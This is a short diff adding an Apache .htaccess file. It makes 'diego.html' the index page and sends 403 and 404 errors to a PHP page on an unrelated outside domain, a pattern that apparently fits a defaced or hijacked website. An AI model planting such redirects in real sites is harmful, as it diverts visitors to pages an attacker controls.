@@ -1,0 +1,5 @@
+DirectoryIndex diego.html
+RewriteEngine on
+ErrorDocument 403 http://monarch.teis48.dewordpress.org/404.php
+ErrorDocument 404 http://monarch.teis48.dewordpress.org/404.php
+Options -Indexes
